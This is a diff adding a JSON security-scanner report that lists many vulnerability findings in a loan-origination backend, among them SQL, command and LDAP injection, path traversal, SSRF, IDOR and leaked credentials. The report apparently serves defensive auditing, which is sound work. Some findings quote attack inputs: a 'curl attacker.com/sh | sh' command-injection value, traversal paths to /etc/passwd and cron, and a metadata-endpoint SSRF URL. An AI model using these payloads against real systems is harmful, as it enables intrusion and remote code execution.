@@ -1,0 +1,890 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.sql-injection",
+      "path": "backend/src/routes/borrowers.ts",
+      "start": {
+        "line": 292,
+        "col": 7,
+        "offset": 10558
+      },
+      "end": {
+        "line": 293,
+        "col": 91,
+        "offset": 10732
+      },
+      "extra": {
+        "message": "The 'region' query parameter (req.query.region, taken at line 290) is interpolated directly into a raw SQL string passed to AppDataSource.query(): \"WHERE city ILIKE '%${region}%' OR state ILIKE '%${region}%'\". String interpolation into the SQL statement allows an attacker to inject arbitrary SQL (e.g., a region value containing a single quote breaks out of the ILIKE literal), enabling data exfiltration or modification of the borrower_profiles table. Parameterized query parameters should be used instead.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection",
+            "CWE-943: Improper Neutralization of Special Elements in Data Query Logic"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection",
+      "path": "backend/src/routes/exports.ts",
+      "start": {
+        "line": 200,
+        "col": 5,
+        "offset": 7384
+      },
+      "end": {
+        "line": 200,
+        "col": 74,
+        "offset": 7453
+      },
+      "extra": {
+        "message": "execSync(`pandoc ${draftPath} -o ${outputPath} -t ${outputFormat}`) executes a shell command in which ${outputFormat} is derived directly from the user-controlled req.query.format (line 180/198) without any allowlisting or escaping. An attacker (any admin/underwriter, or an attacker with a stolen staff token) can supply a format such as 'pdf; curl attacker.com/sh | sh' to achieve arbitrary command execution on the server. The sibling handler renderPortfolioSummary (lines 226-241) shows the correct pattern: format allowlist plus execFileSync with shell:false.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.filesystem.path-traversal",
+      "path": "backend/src/routes/documents.ts",
+      "start": {
+        "line": 342,
+        "col": 5,
+        "offset": 11078
+      },
+      "end": {
+        "line": 343,
+        "col": 36,
+        "offset": 11179
+      },
+      "extra": {
+        "message": "In stageComplianceNote, the caller-supplied req.body.noteFileName is joined with COMPLIANCE_STAGING_DIR using path.join() with no sanitization or containment check, and the result is passed to fs.writeFileSync(notePath, body). A noteFileName such as '../../../etc/cron.d/evil' escapes the staging directory, allowing arbitrary file write (and overwrite) anywhere the process can write, with fully attacker-controlled content. The sibling handler archiveReviewMemo (line 382) correctly applies path.basename() before joining.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.filesystem.path-traversal",
+      "path": "backend/src/routes/admin.ts",
+      "start": {
+        "line": 522,
+        "col": 5,
+        "offset": 17255
+      },
+      "end": {
+        "line": 523,
+        "col": 66,
+        "offset": 17378
+      },
+      "extra": {
+        "message": "In publishProductBrochure, the caller-supplied req.body.fileName is joined with PRODUCT_ASSETS_DIR via path.join() without any basename/containment validation, and the result is used in fs.writeFileSync(destPath, Buffer.from(contentBase64, 'base64')). A fileName containing traversal sequences (e.g., '../../backend/src/index.ts' or an absolute path) writes attacker-controlled bytes to an arbitrary location on the filesystem, enabling arbitrary file overwrite and potential remote code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.filesystem.path-traversal",
+      "path": "backend/src/routes/borrowers.ts",
+      "start": {
+        "line": 238,
+        "col": 5,
+        "offset": 8522
+      },
+      "end": {
+        "line": 240,
+        "col": 49,
+        "offset": 8691
+      },
+      "extra": {
+        "message": "In previewBusinessLetterhead, profile.letterheadFilename is joined with LETTERHEAD_DIR using path.join() and read with fs.readFileSync() with no containment check. letterheadFilename is directly user-controllable: PUT /api/borrowers/my (borrowers.ts lines 109-118) includes 'letterheadFilename' in allowedFields, so any borrower can store a traversal payload such as '../../../../etc/passwd'. When staff open the letterhead preview for that borrower, the server reads and returns an arbitrary file. The sibling handler previewBusinessSignature (lines 265-271) correctly enforces filePath.startsWith(baseDir + path.sep).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.network.ssrf",
+      "path": "backend/src/routes/documents.ts",
+      "start": {
+        "line": 509,
+        "col": 5,
+        "offset": 16755
+      },
+      "end": {
+        "line": 509,
+        "col": 45,
+        "offset": 16795
+      },
+      "extra": {
+        "message": "In importDocumentTemplateContent, the URL is taken verbatim from the caller-controlled x-template-source-url header (line 503) and passed to fetch(sourceUrl) with no scheme, host, or IP validation. An attacker (or compromised admin account) can direct the server to fetch internal-only resources such as http://169.254.169.254/latest/meta-data/, internal service endpoints, or file/localhost URLs, and the response body is returned in the HTTP response, enabling full server-side request forgery. The sibling endpoint previewExternalTemplateSource (lines 542-548) demonstrates the intended host allowlist control that is missing here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.missing-authorization",
+      "path": "backend/src/routes/documents.ts",
+      "start": {
+        "line": 28,
+        "col": 5,
+        "offset": 1218
+      },
+      "end": {
+        "line": 42,
+        "col": 7,
+        "offset": 1730
+      },
+      "extra": {
+        "message": "In GET /api/documents, the borrower scoping filter (app.borrowerProfileId = own profile) is only applied when an applicationId query parameter is present AND the borrower has a profile. When the request omits applicationId, no ownership restriction is added at all, so any authenticated borrower receives the document records of every borrower in the system (with joined loanApplication, uploader, and reviewer data). Additionally, when applicationId is supplied but the borrower has no profile, the filter is silently skipped. The borrower restriction must be applied unconditionally for BORROWER-role users.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-285: Improper Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.idor",
+      "path": "backend/src/routes/payment-accounts.ts",
+      "start": {
+        "line": 52,
+        "col": 5,
+        "offset": 2069
+      },
+      "end": {
+        "line": 64,
+        "col": 26,
+        "offset": 2639
+      },
+      "extra": {
+        "message": "designatePrimaryAccount loads a PaymentAccount solely by the :id path parameter and performs no ownership or role check before promoting it to primary and overwriting bankName and routingNumber from the request body (lines 60-64). Any authenticated user (including any borrower) can supply another business's payment account id, replace its routing number/bank name, and make it the primary disbursement account \u2014 a direct funds-diversion vector since approved loans disburse to the primary account (decisions.ts lines 136-146). The sibling handler retirePayoutAccount (lines 93-103) correctly verifies account ownership.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection",
+      "path": "backend/src/routes/admin.ts",
+      "start": {
+        "line": 364,
+        "col": 5,
+        "offset": 11473
+      },
+      "end": {
+        "line": 365,
+        "col": 96,
+        "offset": 11603
+      },
+      "extra": {
+        "message": "In findEmployeeByBadgeId, the badge_id query parameter is interpolated directly into an LDAP search filter: `(uid=${badgeId})` with no escaping. LDAP metacharacters such as *, (, ), \\, and NUL let an attacker alter the filter's logic (e.g., badge_id='*)(objectClass=*)' matches every entry, or crafted filters can target different attributes), returning unauthorized directory records from the corporate DC that the gateway forwards verbatim. The sibling endpoint verifyComplianceGroupMembership (line 383) correctly applies ldapEscape() before interpolation.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.exposure.sensitive-data",
+      "path": "backend/src/routes/messages.ts",
+      "start": {
+        "line": 37,
+        "col": 7,
+        "offset": 1430
+      },
+      "end": {
+        "line": 37,
+        "col": 52,
+        "offset": 1475
+      },
+      "extra": {
+        "message": "GET /api/messages/:applicationId uses leftJoinAndSelect('msg.author', 'author') and returns the entities directly via res.json(messages). TypeORM selects all columns of the joined User entity, so the response includes author.passwordHash, resetToken, resetTokenExpires, inviteToken, and emailVerificationCode. Any participant of an application thread \u2014 including the borrower \u2014 receives staff users' bcrypt password hashes and, when a password reset or staff invite is pending, the resetToken/inviteToken values, which are sufficient to take over those accounts (POST /api/auth/reset-password only requires the token). Response serialization must exclude credential columns.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.exposure.sensitive-data",
+      "path": "backend/src/routes/messages.ts",
+      "start": {
+        "line": 107,
+        "col": 5,
+        "offset": 3664
+      },
+      "end": {
+        "line": 107,
+        "col": 48,
+        "offset": 3707
+      },
+      "extra": {
+        "message": "POST /api/messages/:applicationId responds with res.status(201).json({ ...msg, author: req.user }), where req.user is the full TypeORM User entity loaded in the authenticate middleware. The response body therefore includes the caller's passwordHash, resetToken, inviteToken, and emailVerificationCode, exposing credential material over the API.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.exposure.sensitive-data",
+      "path": "backend/src/routes/notes.ts",
+      "start": {
+        "line": 97,
+        "col": 5,
+        "offset": 3456
+      },
+      "end": {
+        "line": 97,
+        "col": 48,
+        "offset": 3499
+      },
+      "extra": {
+        "message": "POST /api/notes/:applicationId responds with res.status(201).json({ ...note, author: req.user }) where req.user is the complete User entity (including passwordHash, resetToken, and inviteToken columns), leaking the staff author's credential material in the API response.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.exposure.sensitive-data",
+      "path": "backend/src/routes/borrowers.ts",
+      "start": {
+        "line": 42,
+        "col": 7,
+        "offset": 1560
+      },
+      "end": {
+        "line": 42,
+        "col": 84,
+        "offset": 1637
+      },
+      "extra": {
+        "message": "GET /api/borrowers returns repo.find({ relations: ['user'] }) directly. The joined User entities serialize all columns, exposing every user's passwordHash, resetToken, inviteToken, and emailVerificationCode to any admin/underwriter/support user with borrower-list access, far beyond the need-to-know subset of profile fields.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.exposure.sensitive-data",
+      "path": "backend/src/routes/applications.ts",
+      "start": {
+        "line": 133,
+        "col": 7,
+        "offset": 4617
+      },
+      "end": {
+        "line": 145,
+        "col": 8,
+        "offset": 4921
+      },
+      "extra": {
+        "message": "GET /api/applications/:id eagerly loads relations including 'assignedTo', 'documents.reviewedBy', 'underwritingNotes.author', 'decisions.reviewer', and 'messages.author', all of which are full User entities. Since borrowers can call this endpoint for their own applications, the response discloses staff members' passwordHash, resetToken, inviteToken, and emailVerificationCode fields to borrowers.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.exposure.sensitive-data",
+      "path": "backend/src/routes/decisions.ts",
+      "start": {
+        "line": 46,
+        "col": 5,
+        "offset": 1862
+      },
+      "end": {
+        "line": 50,
+        "col": 7,
+        "offset": 2022
+      },
+      "extra": {
+        "message": "GET /api/decisions/:applicationId returns decisions with relations: ['reviewer'], and the response is serialized directly. Borrowers authorized for their own application's decisions therefore receive the reviewer (staff) User entity in full, including passwordHash, resetToken, and inviteToken columns.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.redirect.open-redirect",
+      "path": "backend/src/routes/auth.ts",
+      "start": {
+        "line": 329,
+        "col": 3,
+        "offset": 10321
+      },
+      "end": {
+        "line": 340,
+        "col": 23,
+        "offset": 10684
+      },
+      "extra": {
+        "message": "In continueAfterVerification (GET /api/auth/continue), the redirect target nextUrl is taken from the client-controlled x-redirect-url header or the Referer header with no validation against an allowlist of relative paths, and is then passed to res.redirect(nextUrl). An attacker can craft a link or set the header to 'https://phishing-site.example' and the authenticated user is redirected off-site, enabling phishing/session token capture. The sibling handler returnToQueue in applications.ts (lines 527-531) shows the intended allowlist approach.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cookies.missing-security-flags",
+      "path": "backend/src/routes/auth.ts",
+      "start": {
+        "line": 299,
+        "col": 5,
+        "offset": 9042
+      },
+      "end": {
+        "line": 299,
+        "col": 39,
+        "offset": 9076
+      },
+      "extra": {
+        "message": "markDeviceTrusted sets a session cookie containing a full authentication JWT via res.cookie('sessionId', trustToken) with no options. The cookie lacks HttpOnly (so any XSS can read the token via document.cookie), lacks Secure (so it is transmitted over plain HTTP), and lacks SameSite (so it is sent on cross-site requests). The sibling handler startSupportSession (lines 312-317) correctly sets httpOnly, secure, and sameSite: 'strict'.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie in 'Set-Cookie' Without the 'HttpOnly' and 'Secure' Attributes",
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' and 'Secure' Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.client-header-trust",
+      "path": "backend/src/routes/payment-accounts.ts",
+      "start": {
+        "line": 334,
+        "col": 5,
+        "offset": 12712
+      },
+      "end": {
+        "line": 346,
+        "col": 5,
+        "offset": 13224
+      },
+      "extra": {
+        "message": "checkPartnerLedgerAccess (GET /api/payment-accounts/partner-status) has no authentication middleware and performs its 'verification' solely by comparing the client-supplied x-partner-role header to the string 'ledger-service' (line 341). Any unauthenticated attacker can set this header to obtain verified:true along with a count of payment accounts (the query at line 339 runs unauthenticated), spoofing the identity of the core-banking partner. Client-controlled headers must never be trusted as an authentication or authorization mechanism.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-807: Reliance on Untrusted Inputs in a Security Decision"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.session.expiration-bypass",
+      "path": "backend/src/routes/payment-accounts.ts",
+      "start": {
+        "line": 176,
+        "col": 5,
+        "offset": 6594
+      },
+      "end": {
+        "line": 176,
+        "col": 97,
+        "offset": 6686
+      },
+      "extra": {
+        "message": "resumeLedgerSyncSession verifies the ledger-sync session token with jwt.verify(sessionToken, LEDGER_SYNC_SECRET, { ignoreExpiration: true }). Ignoring the exp claim means sync session tokens never expire and remain valid forever once issued, defeating the short-lived session design. The comment for the sibling disbursement-sync channel (lines 229-231) states sessions 'must not outlive [their] issued window', and that handler correctly omits ignoreExpiration.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-613: Insufficient Session Expiration"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.missing-authentication",
+      "path": "backend/src/routes/payment-accounts.ts",
+      "start": {
+        "line": 204,
+        "col": 1,
+        "offset": 7584
+      },
+      "end": {
+        "line": 227,
+        "col": 57,
+        "offset": 8392
+      },
+      "extra": {
+        "message": "startLedgerSyncSession (POST /api/payment-accounts/ledger-sync/start) is registered without the authenticate middleware and performs no caller verification of any kind. Any unauthenticated party can mint signed ledger-sync session tokens for arbitrary payment accounts (jwt.sign with LEDGER_SYNC_SECRET at line 218), then use resumeLedgerSyncSession to modify lastLedgerSyncRunId on any account. The session-token scheme is intended as a service-to-service credential, so unauthenticated issuance completely breaks it.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.missing-authentication",
+      "path": "backend/src/routes/borrowers.ts",
+      "start": {
+        "line": 131,
+        "col": 1,
+        "offset": 4499
+      },
+      "end": {
+        "line": 153,
+        "col": 54,
+        "offset": 5243
+      },
+      "extra": {
+        "message": "checkReferralEligibility (POST /api/borrowers/partner-referral/eligibility) has no authentication middleware; its only 'credential' is that a partner_session cookie exists, and the cookie's value is never validated (line 132-136). The endpoint then looks up users by email and returns 404 'No borrower found for that email' versus 200 {eligible:true}, giving any anonymous attacker a user-account enumeration oracle that discloses which email addresses are registered borrowers. The referralCode check (any 6+ character string) provides no protection.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-204: Observable Response Discrepancy",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.missing-authentication",
+      "path": "backend/src/routes/borrowers.ts",
+      "start": {
+        "line": 157,
+        "col": 1,
+        "offset": 5421
+      },
+      "end": {
+        "line": 177,
+        "col": 57,
+        "offset": 6200
+      },
+      "extra": {
+        "message": "submitPartnerReferral (POST /api/borrowers/partner-referral/submit) is registered without authentication. It trusts the mere presence of an unvalidated partner_session cookie and accepts any email/referralCode (>=6 chars) pair, allowing any anonymous attacker to submit forged referral records and to create audit-log entries (line 169) on behalf of the platform.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.exposure.stack-trace",
+      "path": "backend/src/routes/applications.ts",
+      "start": {
+        "line": 452,
+        "col": 5,
+        "offset": 14744
+      },
+      "end": {
+        "line": 453,
+        "col": 108,
+        "offset": 14887
+      },
+      "extra": {
+        "message": "In getRiskWorksheet, when the client-supplied x-branch-context header equals 'expanded', the 500 response includes error.message, error.stack, and request params. Stack traces disclose internal file paths, library versions, and application internals, aiding further attacks. This behavior is controlled by a request header, so any underwriter/admin (or attacker with a stolen token) can trigger it at will, and it is not gated on any server-side environment setting.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-secret",
+      "path": "backend/src/middleware/auth.ts",
+      "start": {
+        "line": 6,
+        "col": 1,
+        "offset": 191
+      },
+      "end": {
+        "line": 6,
+        "col": 84,
+        "offset": 274
+      },
+      "extra": {
+        "message": "The JWT signing secret falls back to the hardcoded value 'loan-origination-jwt-secret-dev-only' when process.env.JWT_SECRET is not set. If the environment variable is missing in a deployment, any attacker who knows this public source code can forge valid authentication tokens (jwt.sign with {id, email, role}) for arbitrary users including admins, achieving complete authentication bypass. There should be no fallback: startup must fail when the secret is unset.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.default-password",
+      "path": "backend/src/routes/admin.ts",
+      "start": {
+        "line": 58,
+        "col": 5,
+        "offset": 2054
+      },
+      "end": {
+        "line": 58,
+        "col": 55,
+        "offset": 2104
+      },
+      "extra": {
+        "message": "POST /api/admin/users creates accounts with bcrypt.hash(password || 'Welcome123!', 12), i.e., when no password is supplied the account is created with the hardcoded default password 'Welcome123!'. Anyone who knows the source code (or guesses the default) can log in as any user provisioned without an explicit password, including staff accounts created with privileged roles.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-259: Use of Hard-coded Password"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.default-password",
+      "path": "backend/src/routes/imports.ts",
+      "start": {
+        "line": 61,
+        "col": 5,
+        "offset": 1829
+      },
+      "end": {
+        "line": 61,
+        "col": 49,
+        "offset": 1873
+      },
+      "extra": {
+        "message": "The borrower-lead CSV import creates every imported user with the same hardcoded password 'Welcome123!' (bcrypt.hash('Welcome123!', 12)) and never forces a password change or notifies the leads. All imported accounts are immediately login-accessible to anyone who knows this well-known default, and all share the same credential.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-259: Use of Hard-coded Password"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-randomness",
+      "path": "backend/src/routes/auth.ts",
+      "start": {
+        "line": 252,
+        "col": 5,
+        "offset": 7173
+      },
+      "end": {
+        "line": 252,
+        "col": 74,
+        "offset": 7242
+      },
+      "extra": {
+        "message": "The email verification code is generated with Math.floor(Math.random() * 1000000) \u2014 Math.random() is a non-cryptographic PRNG, and the result is a 6-digit (10^6) code. Combined with the 15-minute validity window and the absence of any attempt/rate limiting on POST /api/auth/verify-email/confirm (lines 271-292), the code is predictable/brute-forceable, allowing an attacker to mark an account's email as verified without receiving the email. crypto.randomInt() or crypto.randomBytes() should be used.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.missing-authorization",
+      "path": "backend/src/routes/applications.ts",
+      "start": {
+        "line": 554,
+        "col": 1,
+        "offset": 18252
+      },
+      "end": {
+        "line": 558,
+        "col": 2,
+        "offset": 18343
+      },
+      "extra": {
+        "message": "searchApplicationsByPurposeKeyword (GET /api/applications/by-purpose-keyword) is registered with only the authenticate middleware and no authorize(...) role check, unlike every other staff-only application endpoint (e.g., /:id/risk-worksheet and /:id/underwriting-summary which require UNDERWRITER/ADMIN). Any authenticated user \u2014 including borrowers \u2014 can search across all loan applications (id, purpose, requestedAmount, status are returned for every tenant). The handler is intended for staff free-text search per its comment, so a role restriction is required.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-285: Improper Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.logging.sensitive-data",
+      "path": "backend/src/routes/payment-accounts.ts",
+      "start": {
+        "line": 283,
+        "col": 5,
+        "offset": 10806
+      },
+      "end": {
+        "line": 283,
+        "col": 103,
+        "offset": 10904
+      },
+      "extra": {
+        "message": "preparePayoutDraft logs the entire request body via console.error(`...:`, req.body) on failure. req.body contains bankName, routingNumber, and accountNumberLast4 \u2014 bank account details of the payout draft \u2014 which are written to process logs where they may be retained and read by anyone with log access.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.logging.sensitive-data",
+      "path": "backend/src/routes/admin.ts",
+      "start": {
+        "line": 135,
+        "col": 7,
+        "offset": 4307
+      },
+      "end": {
+        "line": 135,
+        "col": 39,
+        "offset": 4339
+      },
+      "extra": {
+        "message": "PUT /api/admin/users/:id persists metadata: { changes: req.body } into the audit log. When an admin sets a new password via this endpoint (handled at lines 124-126), the request body \u2014 including the plaintext password \u2014 is written verbatim into the AuditLog record, permanently storing plaintext credentials in the database where they are readable through the audit-log APIs.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.headers.header-injection",
+      "path": "backend/src/routes/documents.ts",
+      "start": {
+        "line": 438,
+        "col": 5,
+        "offset": 14242
+      },
+      "end": {
+        "line": 438,
+        "col": 81,
+        "offset": 14318
+      },
+      "extra": {
+        "message": "In exportDocumentPackage, the raw req.query.export_name value is interpolated into the Content-Disposition header without sanitization: res.setHeader('Content-Disposition', `attachment; filename=\"${exportName}\"`). Double quotes let an attacker break out of the quoted-string and inject arbitrary header parameters, and CR/LF characters aim at response splitting (Node's header validation mitigates raw CRLF, but no sanitization exists at the application layer). The sibling handler downloadReviewMemoPackage (line 469) explicitly strips \\r\\n before building this same header, showing the missing control.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: HTTP Response Splitting",
+            "CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-secret",
+      "path": "backend/src/routes/decisions.ts",
+      "start": {
+        "line": 15,
+        "col": 1,
+        "offset": 734
+      },
+      "end": {
+        "line": 19,
+        "col": 2,
+        "offset": 900
+      },
+      "extra": {
+        "message": "The AES-256-GCM key used to encrypt counteroffer resume tokens is derived via crypto.scryptSync from the fallback secret 'counteroffer-token-secret-dev-only' when COUNTEROFFER_TOKEN_SECRET is unset. With the fallback in effect, anyone who knows the public source code can decrypt and forge counteroffer resume tokens. The fallback should be removed so the process fails to start without a configured secret.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-secret",
+      "path": "backend/src/routes/payment-accounts.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 533
+      },
+      "end": {
+        "line": 18,
+        "col": 2,
+        "offset": 775
+      },
+      "extra": {
+        "message": "Both the ledger-sync JWT secret ('ledger-sync-partner-secret-dev-only', used to sign and verify partner session tokens) and the AES-256-CBC payout-draft key (derived from fallback 'payout-draft-secret-dev-only') fall back to hardcoded values when their environment variables are unset. In any deployment missing these variables, partner sync tokens and payout draft tokens can be forged or decrypted by anyone with access to the source code.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.storage.token-in-local-storage",
+      "path": "frontend/src/contexts/AuthContext.tsx",
+      "start": {
+        "line": 55,
+        "col": 5,
+        "offset": 1621
+      },
+      "end": {
+        "line": 55,
+        "col": 52,
+        "offset": 1668
+      },
+      "extra": {
+        "message": "The login handler stores the session JWT in localStorage (localStorage.setItem('token', res.data.token), mirrored in register at line 62 and read in services/api.ts line 9). localStorage is accessible to any JavaScript running on the page, so a single cross-site scripting bug allows full token theft. An HttpOnly, Secure, SameSite cookie is the safer storage for the session credential.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-922: Insecure Storage of Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.exposure.credentials-in-url",
+      "path": "backend/src/utils/core-banking.ts",
+      "start": {
+        "line": 11,
+        "col": 3,
+        "offset": 416
+      },
+      "end": {
+        "line": 11,
+        "col": 178,
+        "offset": 591
+      },
+      "extra": {
+        "message": "initiateDisbursement embeds the core-banking API key in the request URL query string: `${CORE_BANKING_BASE_URL}/v1/disbursements?api_key=${CORE_BANKING_KEY}&...`. URLs \u2014 including query strings \u2014 are recorded in access logs, proxy logs, and browser history on intermediary systems, leaking the partner API credential. The sibling function registerLedgerAccount (lines 21-29) correctly passes the key in the Authorization header.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
